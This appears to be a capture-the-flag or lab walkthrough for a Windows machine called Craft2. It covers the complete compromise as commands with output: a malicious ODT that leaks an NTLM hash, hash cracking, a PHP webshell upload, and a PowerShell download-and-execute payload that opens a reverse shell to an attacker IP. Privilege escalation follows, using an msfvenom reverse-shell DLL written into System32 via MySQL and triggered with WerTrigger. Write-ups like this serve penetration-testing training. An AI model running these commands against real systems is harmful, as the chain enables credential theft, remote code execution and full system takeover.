# 🪟 Craft2

## Enumerating Services

First, we'll perform a generic scan to identify the open ports and services running on this machine.

```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.188

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Craft
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumerating port 445

We found a service being shared but were unable to access it.

```shell
smbmap -H 192.168.173.165 -u 'null' --no-banner

netexec smb 192.168.173.165 -u '' -p '' --shares
```

## Enumerating port 80

Navigating to port 80 we find a web page with a file upload field. When we send a real `.odt` file, we get a message not to send macros because the staff is watching — indicating the server opens the file.

We opened an SMB listener with impacket to capture the target's hash, but the target didn't interpret the command correctly. ODT files don't accept macros, but we can embed a photo inside the file with the URL of our SMB share. We found a Python script that does this correctly.

```shell
# SMB Server
impacket-smbserver share . -smb2support

# Create the odt file
echo test 1,2,3. > test.txt
soffice --writer --convert-to odt test.txt

# Git
wget https://raw.githubusercontent.com/rmdavy/badodf/master/badodt.py

python3 badodt.py
```

## Password Attack

This time, we received the hash from the server.

```shell
# Hash
thecybergeek::CRAFT2:aaaaaaaaaaaaaaaa:dfb05dfc88c97463ea6a2db6e6a38727:...

# Cracking
hashcat -m 5600 -a 0 hash.craft2 $(locate rockyou.txt) --force
winniethepooh
```

## Initial Access

With the user's credentials we accessed the SMB share and realized that it was the root of the web server, so we uploaded a webshell in PHP to get a reverse shell.

```shell
crackmapexec smb 192.168.182.188 --shares -u 'thecybergeek' -p 'winniethepooh'

smbclient //192.168.232.188/WebApp -U 'thecybergeek%winniethepooh'
put shell_php_ruan.php
```

We then navigate to the malicious file and inject a command into the target to receive a reverse shell.

```shell
# Listener
python3 -m http.server 80
rlwrap -cAra nc -vnlp 443

# Payload
powershell.exe -ep bypass "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.221/powercat.ps1');powercat -c 192.168.45.221 -p 443 -e powershell"

# Evidence
type C:\Users\apache\Desktop\local.txt
d97cf7c61243f8bc0c7d24050fda2bd6
```

## Privilege Escalation

WinPEAS revealed a SQL service running in loopback on port 3306, running as LocalSystem.

```shell
# WinPEAS
iwr -uri http://192.168.45.205/winPEASx64.exe -outfile winPEASx64.exe
.\winPEASx64.exe

sc.exe qc Mysql

SERVICE_NAME: Mysql
        SERVICE_START_NAME : LocalSystem
```

We created an HTTP tunnel with chisel to access the service from our Kali machine.

```shell
# Start chisel server on kali
./chisel_1.9.1_linux_amd64 server -p 10000 --reverse

# Transfer chisel to the target
iwr -uri http://192.168.45.221/chisel_1.9.1_windows_amd64.exe -outfile chisel_1.9.1_windows_amd64.exe

# Create a Tunnel
./chisel_1.9.1_windows_amd64.exe client 192.168.45.221:10000 R:3306:127.0.0.1:3306
```

We accessed the service with the default Xampp credentials (root:null) and confirmed that we had privilege on the machine. We also realized that we could write files to System32, which allows deploying `phoneinfo.dll` via WerTrigger.

```shell
# MySQL Connect
mysql -h 127.0.0.1 -u root -p

# Evidence
select load_file('C:\\\\Users\\Administrator\\Desktop\\proof.txt');

# Create a malicious DLL
msfvenom --platform windows --arch x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=443 -f dll -o phoneinfo.dll

# Download WerTrigger
git clone https://github.com/sailay1996/wertrigger
cp WerTrigger/bin/report.wer .
cp WerTrigger/bin/wertrigger.exe .

# Transfer to the target
wget http://192.168.45.221/phoneinfo.dll -o phoneinfo.dll
wget http://192.168.45.221/wertrigger.exe -o werTrigger.exe
wget http://192.168.45.221/report.wer -o report.wer

# Move the dll to System32
select load_file('C:\\\\xampp\\htdocs\\phoneinfo.dll') into dumpfile 'C:\\\\Windows\\system32\\phoneinfo.dll';

# Listener
rlwrap -cAra nc -vnlp 443

# Trigger
.\WerTrigger.exe
```
